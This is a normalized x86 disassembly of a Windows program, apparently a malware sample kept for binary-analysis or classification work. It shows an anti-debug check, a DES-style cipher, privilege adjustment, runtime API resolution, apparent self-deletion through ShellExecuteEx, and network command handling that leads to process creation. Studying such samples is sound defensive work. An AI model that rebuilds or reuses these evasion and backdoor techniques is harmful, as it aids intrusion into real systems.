sub_401001
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push r--data
push eax
mov [ ebp - 0x30 ] ecx
call sub_4045ae
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push ebx
push 0x0
push 0x0
push esi
call sub_4043e8
xor ebx ebx
add esp 0xc
inc ebx
call [ GetLastError@IAT ]
mov edx eax
push 0x7
pop ecx
xor eax eax
mov [ ebp - 0x24 ] 0x0
lea edi [ ebp - 0x23 ]
[ edi ]
stosw [ edi ]
push edx
push r--data
stosb [ edi ]
lea eax [ ebp - 0x24 ]
push r--data
push eax
call sub_40446d
add esp 0x10
lea eax [ ebp - 0x24 ]
push eax
call [ OutputDebugStringA@IAT ]
xor eax eax
push esi
call sub_40475a
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x27 ] 0x34
jne r-xdata
push esi
push 0x4
lea eax [ ebp - 0x28 ]
push ebx
push eax
call sub_404a2e
add esp 0x10
cmp [ ebp - 0x28 ] 0x1b
jne r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0x26 ] 0x5e
jne r-xdata
push esi
call sub_4042b0
pop ecx
mov eax ebx
pop ebx
jmp r-xdata
cmp [ ebp - 0x25 ] 0x2d
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4045c5
leave
retn 0xc
push esi
push ebx
push [ ebp + 0x10 ]
push edi
call sub_404a2e
push esi
push ebx
lea eax [ ebp - 0x2c ]
push 0x4
push eax
call sub_404a2e
push esi
push ebx
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
call sub_404a2e
add esp 0x30
call [ GetLastError@IAT ]
mov edx eax
push 0x7
pop ecx
xor eax eax
mov [ ebp - 0x24 ] 0x0
lea edi [ ebp - 0x23 ]
[ edi ]
stosw [ edi ]
push edx
push r--data
stosb [ edi ]
lea eax [ ebp - 0x24 ]
push r--data
push eax
call sub_40446d
add esp 0x10
lea eax [ ebp - 0x24 ]
push eax
call [ OutputDebugStringA@IAT ]
sub_401134
push ebx
push esi
push edi
push r--data
mov esi ecx
call [ LoadLibraryA@IAT ]
mov edi [ GetProcAddress@IAT ]
mov ebx eax
push r--data
push ebx
call edi
push r--data
push ebx
mov [ esi + 0x698 ] eax
call edi
push r--data
push ebx
mov [ esi + 0x69c ] eax
call edi
pop edi
mov [ esi + 0x6a0 ] eax
pop esi
pop ebx
retn
sub_40117d
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] eax
jle r-xdata
push [ ebp + 0x14 ]
add ecx 0x601
push ecx
push [ ebp + 0x8 ]
call sub_404a50
add esp 0xc
pop ebp
retn 0x10
push esi
mov edx [ ebp + 0x10 ]
movsx edx [ eax + edx ]
mov esi [ ebp + 0xc ]
mov dl [ edx + esi - 0x1 ]
mov [ ecx + eax + 0x601 ] dl
inc eax
cmp eax [ ebp + 0x14 ]
jl r-xdata
pop esi
sub_4011bd
push esi
mov esi [ esp + 0x10 ]
test esi esi
jle r-xdata
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub ecx eax
mov dl [ ecx + eax ]
xor [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_4011dd
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x18 ]
push edi
lea ebx [ ecx + 0x601 ]
push esi
push ebx
call sub_404a50
mov eax [ esp + 0x20 ]
sub eax edi
push eax
lea eax [ esi + edi ]
push eax
push esi
call sub_404a50
push edi
sub esi edi
add esi [ esp + 0x30 ]
push ebx
push esi
call sub_404a50
add esp 0x24
pop edi
pop esi
pop ebx
retn 0xc
sub_40121e
xor eax eax
cmp [ esp + 0xc ] eax
jle r-xdata
retn 0xc
push esi
mov esi [ esp + 0xc ]
mov edx eax
sar edx 0x3
mov dl [ edx + esi ]
mov cl al
and cl 0x7
sar dl cl
mov ecx [ esp + 0x8 ]
and dl 0x1
mov [ eax + ecx ] dl
inc eax
cmp eax [ esp + 0x10 ]
jl r-xdata
pop esi
sub_40124f
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
sar eax 0x3
push eax
xor esi esi
push esi
push edi
call sub_4046e0
add esp 0xc
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop edi
pop esi
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
mov dl [ esi + edx ]
mov ecx esi
and ecx 0x7
mov eax esi
shl dl cl
sar eax 0x3
add eax edi
or [ eax ] dl
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
sub_401291
push ebx
push ebp
push esi
push edi
push 0x40
push [ esp + 0x1c ]
mov edi rw-data
push edi
mov ebx ecx
call sub_40121e
push 0x38
push r--data
push edi
push edi
mov ecx ebx
call sub_40117d
mov eax [ esp + 0x14 ]
xor ebp ebp
mov [ esp + 0x18 ] eax
lea esi [ ebp + r--data ]
movsx eax [ esi ]
push eax
push 0x1c
push [ rw-data ]
mov ecx ebx
call sub_4011dd
movsx eax [ esi ]
push eax
push 0x1c
push [ rw-data ]
mov ecx ebx
call sub_4011dd
push 0x30
push r--data
push edi
push [ esp + 0x24 ]
mov ecx ebx
call sub_40117d
add [ esp + 0x18 ] 0x30
inc ebp
cmp ebp 0x10
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_401313
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x8
mov [ ebp - 0x4 ] ecx
xor edi edi
pop ebx
mov al [ esi + 0x1 ]
mov cl [ esi ]
add al al
add al [ esi + 0x2 ]
add cl cl
add cl [ esi + 0x5 ]
add al al
add al [ esi + 0x3 ]
movsx ecx cl
add al al
add al [ esi + 0x4 ]
add ecx edi
movsx eax al
shl ecx 0x4
push 0x4
lea eax [ eax + ecx + r--data ]
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_40121e
add [ ebp + 0x8 ] 0x4
add edi 0x4
add esi 0x6
dec ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_401372
push esi
push edi
mov esi ecx
push 0x10
lea edi [ esi + 0x701 ]
push 0x0
push edi
call sub_4046e0
add esp 0xc
cmp [ esp + 0x10 ] 0x10
jle r-xdata
mov eax [ esp + 0x10 ]
push 0x10
pop eax
jmp r-xdata
xor al al
lea eax [ esi + 0x709 ]
push eax
lea eax [ esi + 0x300 ]
push eax
mov ecx esi
call sub_401291
mov al 0x1
jmp r-xdata
push eax
push [ esp + 0x10 ]
push edi
call sub_404a50
add esp 0xc
push edi
push esi
mov ecx esi
call sub_401291
cmp [ esp + 0x10 ] 0x8
jle r-xdata
pop edi
mov [ esi + 0x600 ] al
pop esi
retn 0x8
sub_4013dd
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push 0x30
push r--data
push ebx
mov esi rw-data
push esi
mov edi ecx
call sub_40117d
push 0x30
push [ esp + 0x18 ]
mov ecx edi
push esi
call sub_4011bd
push esi
push ebx
mov ecx edi
call sub_401313
push 0x20
push r--data
push ebx
push ebx
mov ecx edi
call sub_40117d
pop edi
pop esi
pop ebx
retn 0x8
sub_401426
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x40
push [ ebp + 0xc ]
mov ebx rw-data
push ebx
mov [ ebp - 0x4 ] ecx
call sub_40121e
mov ecx [ ebp - 0x4 ]
push 0x40
push r--data
push ebx
push ebx
call sub_40117d
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
mov esi rw-data
jne r-xdata
add eax 0x2d0
mov [ ebp + 0xc ] 0xf
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x10 ] 0x10
push 0x20
push [ rw-data ]
push esi
call sub_404a50
mov ecx [ ebp - 0x4 ]
add esp 0xc
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_4013dd
mov edi [ rw-data ]
mov ecx [ ebp - 0x4 ]
push 0x20
push edi
push [ rw-data ]
call sub_4011bd
push 0x20
push esi
push edi
call sub_404a50
sub [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov ecx [ ebp - 0x4 ]
push 0x40
push r--data
push ebx
push ebx
call sub_40117d
mov ecx [ ebp - 0x4 ]
push 0x40
push ebx
push [ ebp + 0x8 ]
call sub_40124f
pop edi
pop esi
pop ebx
leave
retn 0x10
push 0x20
push [ rw-data ]
push esi
call sub_404a50
mov ecx [ ebp - 0x4 ]
add esp 0xc
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_4013dd
mov edi [ rw-data ]
mov ecx [ ebp - 0x4 ]
push 0x20
push edi
push [ rw-data ]
call sub_4011bd
push 0x20
push esi
push edi
call sub_404a50
add [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0x10 ]
jne r-xdata
jmp r-xdata
sub_401540
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test ebx ebx
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edi [ ebp + 0x10 ]
add edi 0x7
and edi 0xfffffff8
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_401372
sar edi 0x3
cmp [ esi + 0x600 ] 0x0
jne r-xdata
mov eax edi
test eax eax
jle r-xdata
test edi edi
jle r-xdata
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
lea edi [ esi + 0x300 ]
sete [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_401426
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_401426
push [ ebp + 0x8 ]
mov ecx esi
push edi
push ebx
push ebx
call sub_401426
push [ ebp + 0x1c ]
mov ecx esi
push esi
push ebx
push ebx
call sub_401426
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec [ ebp + 0x14 ]
jne r-xdata
jmp r-xdata
sub_40161e
push ebx
push ebp
push esi
push edi
mov esi ecx
xor ebx ebx
mov edi 0x2000
mov ebp edi
cmp [ esi + 0x4 ] ebx
jne r-xdata
push edi
call sub_4050ad
pop ecx
mov [ esi + 0x4 ] eax
cmp eax ebx
je r-xdata
push ebx
call sub_404db5
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push edi
push eax
push 0x5
call [ esi ]
mov ebx 0xc0000004
jmp r-xdata
cmp eax ebx
je r-xdata
add ebp edi
push ebp
push [ esi + 0x4 ]
call sub_404e43
pop ecx
pop ecx
push 0x0
push ebp
push eax
push 0x5
mov [ esi + 0x4 ] eax
call [ esi ]
sub_401699
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x4 ]
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
leave
retn 0x8
push esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
xor esi esi
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
neg eax
push esi
sbb eax eax
push esi
and eax 0x2
push esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
inc eax
jmp r-xdata
pop esi
sub_40171b
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov esi ecx
call sub_40161e
mov edi [ MultiByteToWideChar@IAT ]
xor ebx ebx
push ebx
push ebx
push 0xffffffff
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
push ebx
push ebx
call edi
xor ecx ecx
push 0x2
pop edx
mov [ ebp - 0xc ] eax
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_4051ec
pop ecx
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push ebx
push ebx
call edi
cmp [ eax + 0x3c ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x4 ]
push 0x4
push [ eax + 0x3c ]
push [ ebp - 0x8 ]
call sub_40f75e
add esp 0xc
test eax eax
mov eax [ esi + 0x4 ]
je r-xdata
mov ecx [ eax ]
add ecx eax
mov [ esi + 0x4 ] ecx
mov esi [ eax + 0x44 ]
jmp r-xdata
mov ecx [ eax ]
add ecx eax
mov [ esi + 0x4 ] ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x8 ]
call sub_405177
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x4
mov eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
sub_4017c3
push ebp
lea ebp [ esp - 0x2cc ]
sub esp 0x34c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2c8 ] eax
push ebx
push esi
push edi
mov esi 0x104
push esi
lea eax [ ebp + 0x1c4 ]
push eax
xor edi edi
push edi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
xor eax eax
push esi
lea eax [ ebp + 0x1c4 ]
push eax
push eax
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x44 ]
push eax
push r--data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
push r--data
lea eax [ ebp + 0xc0 ]
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea eax [ ebp + 0x1c4 ]
push eax
lea eax [ ebp + 0xc0 ]
push eax
call esi
push r--data
lea eax [ ebp + 0xc0 ]
push eax
call esi
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x78 ] edi
lea eax [ ebp + 0xc0 ]
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x64 ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ ebp - 0x80 ] 0x3c
mov [ ebp - 0x74 ] r--data
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x7c ] 0x40
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
push eax
call [ SetThreadPriority@IAT ]
lea eax [ ebp - 0x80 ]
push eax
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call [ SetThreadPriority@IAT ]
push 0x40
push [ ebp - 0x48 ]
call esi
push 0x1
push [ ebp - 0x48 ]
call [ SetProcessPriorityBoost@IAT ]
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp + 0x2c8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
add ebp 0x2cc
leave
retn
sub_401909
push ebp
lea ebp [ esp - 0x74 ]
sub esp 0x684
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x70 ] eax
push ebx
push esi
mov esi [ ebp + 0x7c ]
xor ebx ebx
push edi
push 0xff
lea eax [ ebp - 0x433 ]
push ebx
push eax
mov [ ebp - 0x564 ] ebx
mov [ ebp - 0x574 ] ebx
mov [ ebp - 0x55c ] ebx
mov [ ebp - 0x568 ] ebx
mov [ ebp - 0x434 ] bl
call sub_4046e0
push 0x7
pop ecx
xor eax eax
mov [ ebp + 0x50 ] bl
lea edi [ ebp + 0x51 ]
[ edi ]
stosw [ edi ]
push 0x103
stosb [ edi ]
lea eax [ ebp - 0x133 ]
push ebx
push eax
mov [ ebp - 0x57c ] 0x1
mov [ ebp - 0x134 ] bl
call sub_4046e0
mov eax [ esi + 0xd26 ]
mov [ ebp - 0x590 ] eax
mov eax [ esi + 0xd2a ]
mov [ ebp - 0x544 ] eax
mov eax [ esi + 0xd36 ]
mov [ ebp - 0x5bc ] eax
mov eax [ esi + 0xd3e ]
mov [ ebp - 0x578 ] eax
add esp 0x18
lea eax [ esi + 0x6d4 ]
push eax
call [ esi + 0x698 ]
mov [ ebp - 0x550 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x70 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4045c5
add ebp 0x74
leave
retn 0x4
lea eax [ esi + 0x6a4 ]
push eax
call [ esi + 0x698 ]
mov [ ebp - 0x570 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x6b4 ]
push eax
call [ esi + 0x698 ]
mov [ ebp - 0x56c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x6e4 ]
push eax
call [ esi + 0x698 ]
test eax eax
je r-xdata
lea eax [ esi + 0x6f4 ]
push eax
call [ esi + 0x698 ]
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ esi + 0x708 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x598 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x738 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x5b8 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x718 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x5a0 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x728 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x588 ] eax
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x56c ]
lea eax [ esi + 0x9de ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x5a4 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xa2e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x538 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xa0e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x5b4 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x9ee ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x5ac ] eax
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x570 ]
lea eax [ esi + 0xc5e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x554 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc8e ]
push eax
push [ ebp - 0x550 ]
call [ esi + 0x69c ]
mov [ ebp - 0x5b0 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc3e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x56c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc4e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x54c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc7e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x570 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x77c ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x560 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7bc ]
push eax
push edi
call [ esi + 0x69c ]
test eax eax
je r-xdata
lea eax [ esi + 0x76c ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x540 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x868 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x53c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x7f4 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x59c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x82c ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x594 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x800 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x584 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x8b4 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x548 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xc26 ]
push eax
push [ ebp - 0x550 ]
call [ esi + 0x69c ]
mov [ ebp - 0x58c ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0xa9e ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x5a8 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x794 ]
push eax
push edi
call [ esi + 0x69c ]
mov [ ebp - 0x580 ] eax
cmp eax ebx
je r-xdata
push esi
push ebx
push ebx
call [ ebp - 0x540 ]
cmp eax ebx
je r-xdata
push 0x1
push eax
call [ ebp - 0x53c ]
push 0x1
push 0x1
push esi
call [ ebp - 0x544 ]
lea eax [ esi + 0x1f8 ]
push eax
lea eax [ ebp - 0x134 ]
push eax
call [ ebp - 0x54c ]
lea eax [ ebp - 0x134 ]
push eax
call [ ebp - 0x56c ]
lea ecx [ ebp - 0x134 ]
dec ecx
cmp [ eax + ecx ] 0x5c
je r-xdata
lea eax [ esi + 0xd4 ]
push eax
lea eax [ ebp - 0x134 ]
push eax
call [ ebp - 0x554 ]
cmp [ esi + 0x3b8 ] ebx
je r-xdata
lea eax [ esi + 0x30 ]
push eax
lea eax [ ebp - 0x134 ]
push eax
call [ ebp - 0x554 ]
push 0x80
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x548 ]
lea eax [ esi + 0x4dc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x54c ]
lea eax [ esi + 0x4fc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x554 ]
lea eax [ esi + 0x53c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x554 ]
push ebx
push ebx
push ebx
push ebx
lea eax [ esi + 0x4ec ]
push eax
call [ ebp - 0x5a4 ]
mov edi eax
mov [ ebp - 0x540 ] edi
cmp edi ebx
jne r-xdata
lea edi [ esi + 0xf4 ]
push edi
lea eax [ ebp - 0x134 ]
push eax
call [ ebp - 0x570 ]
test eax eax
je r-xdata
push ebx
push 0xc4000100
push ebx
push ebx
lea eax [ ebp - 0x30 ]
push eax
push edi
call [ ebp - 0x5ac ]
mov [ ebp - 0x53c ] eax
cmp eax ebx
jne r-xdata
push [ esi + 0x4c0 ]
push 0x1
push esi
call [ ebp - 0x544 ]
jmp r-xdata
push ebx
lea eax [ ebp - 0x134 ]
push eax
push edi
call [ ebp - 0x59c ]
push 0x80
push edi
call [ ebp - 0x594 ]
push edi
call [ ebp - 0x584 ]
mov edi 0x100
push edi
lea eax [ ebp - 0x334 ]
push eax
call [ ebp - 0x548 ]
lea eax [ ebp - 0x574 ]
push eax
push edi
lea eax [ ebp - 0x334 ]
push eax
push [ ebp - 0x53c ]
mov [ ebp - 0x574 ] ebx
call [ ebp - 0x5b4 ]
push [ ebp - 0x53c ]
test eax eax
jne r-xdata
push edi
jmp r-xdata
call [ ebp - 0x538 ]
push edi
lea eax [ ebp - 0x534 ]
push eax
call [ ebp - 0x548 ]
lea eax [ ebp - 0x534 ]
push eax
lea eax [ ebp - 0x334 ]
push eax
push esi
call [ ebp - 0x5bc ]
test eax eax
jne r-xdata
call [ ebp - 0x538 ]
push [ ebp - 0x540 ]
jmp r-xdata
call [ ebp - 0x538 ]
jmp r-xdata
push edi
lea eax [ ebp - 0x234 ]
push eax
call [ ebp - 0x548 ]
xor eax eax
inc eax
push [ ebp - 0x540 ]
call [ ebp - 0x538 ]
push [ ebp - 0x53c ]
mov [ ebp + eax - 0x234 ] bl
lea eax [ esi + 0x28 ]
push eax
lea eax [ ebp - 0x234 ]
push eax
call [ ebp - 0x5b0 ]
pop ecx
pop ecx
mov [ ebp - 0x550 ] eax
cmp eax ebx
je r-xdata
mov [ ebp + eax - 0x235 ] cl
inc eax
cmp eax edi
jl r-xdata
mov edi [ ebp - 0x554 ]
push edi
lea eax [ ebp - 0x334 ]
push eax
call [ ebp - 0x548 ]
mov edi [ ebp - 0x550 ]
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebp - 0x334 ]
push eax
mov [ edi ] bl
call [ ebp - 0x54c ]
lea eax [ edi + 0x1 ]
mov edi [ ebp - 0x554 ]
push eax
lea eax [ ebp - 0x334 ]
push eax
call edi
lea eax [ ebp - 0x334 ]
mov [ ebp - 0x550 ] eax
jmp r-xdata
mov cl [ ebp + eax - 0x534 ]
cmp cl bl
je r-xdata
sub eax 0x65
je r-xdata
movsx eax [ ebp - 0x534 ]
cmp eax 0x64
jg r-xdata
push 0x80
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x548 ]
lea eax [ esi + 0x4dc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x54c ]
lea eax [ esi + 0x4fc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ esi + 0x34 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ ebp - 0x234 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x434 ]
push eax
push esi
call [ ebp - 0x578 ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x80
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x548 ]
lea eax [ esi + 0x4dc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x54c ]
lea eax [ esi + 0x4fc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ esi + 0x34 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ ebp - 0x234 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x434 ]
push eax
push esi
call [ ebp - 0x578 ]
jmp r-xdata
sub eax 0x44
je r-xdata
push [ ebp - 0x53c ]
call [ ebp - 0x538 ]
push [ ebp - 0x540 ]
call [ ebp - 0x538 ]
push [ esi + 0x4c4 ]
push ebx
cmp [ ebp - 0x550 ] ebx
je r-xdata
push 0x80
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x548 ]
lea eax [ esi + 0x4dc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call [ ebp - 0x54c ]
lea eax [ esi + 0x4fc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ esi + 0x34 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ ebp - 0x234 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call edi
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x434 ]
push eax
push esi
call [ ebp - 0x578 ]
test eax eax
je r-xdata
sub eax 0x5
je r-xdata
dec eax
jmp r-xdata
push [ ebp - 0x558 ]
call [ ebp - 0x588 ]
jmp r-xdata
lea eax [ ebp - 0x134 ]
push eax
call [ ebp - 0x56c ]
push eax
lea eax [ ebp - 0x134 ]
push eax
push 0x1
push ebx
push edi
push [ ebp - 0x558 ]
call [ ebp - 0x5a0 ]
push 0x44
pop edi
push edi
lea eax [ ebp - 0x610 ]
push eax
call [ ebp - 0x548 ]
push 0x10
lea eax [ ebp - 0x5cc ]
push eax
mov [ ebp - 0x610 ] edi
call [ ebp - 0x548 ]
lea eax [ ebp - 0x5cc ]
push eax
lea eax [ ebp - 0x610 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x434 ]
push eax
push ebx
call [ ebp - 0x5a8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x334 ]
push eax
lea eax [ ebp - 0x434 ]
push eax
call edi
lea eax [ ebp - 0x434 ]
push eax
call [ esi + 0x698 ]
mov edi eax
cmp edi ebx
je r-xdata
push [ ebp - 0x53c ]
call [ ebp - 0x538 ]
push [ ebp - 0x540 ]
call [ ebp - 0x538 ]
cmp [ ebp - 0x533 ] 0x75
jne r-xdata
dec eax
je r-xdata
je r-xdata
push [ ebp - 0x5cc ]
call [ ebp - 0x560 ]
push [ ebp - 0x5c8 ]
call [ ebp - 0x560 ]
cmp [ ebp - 0x55c ] ebx
je r-xdata
push [ esi + 0x4c8 ]
jmp r-xdata
cmp [ ebp - 0x532 ] 0x69
jne r-xdata
cmp [ ebp - 0x55c ] ebx
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0xa6e ]
push eax
push edi
call [ esi + 0x69c ]
lea ecx [ ebp - 0x568 ]
push ecx
push ebx
push [ ebp - 0x550 ]
push eax
push ebx
push ebx
call [ ebp - 0x580 ]
jmp r-xdata
push [ ebp - 0x55c ]
call [ ebp - 0x560 ]
push 0x1
jmp r-xdata
cmp [ ebp - 0x531 ] 0x74
jne r-xdata
push 0x40
lea edi [ esi + 0x378 ]
push edi
call [ ebp - 0x548 ]
lea eax [ ebp - 0x234 ]
push eax
push edi
call [ ebp - 0x54c ]
lea eax [ ebp - 0x568 ]
push eax
push ebx
push esi
push [ ebp - 0x590 ]
push ebx
push ebx
call [ ebp - 0x580 ]
mov [ ebp - 0x55c ] eax
push eax
mov eax edx
add eax ecx
mov eax 0x1
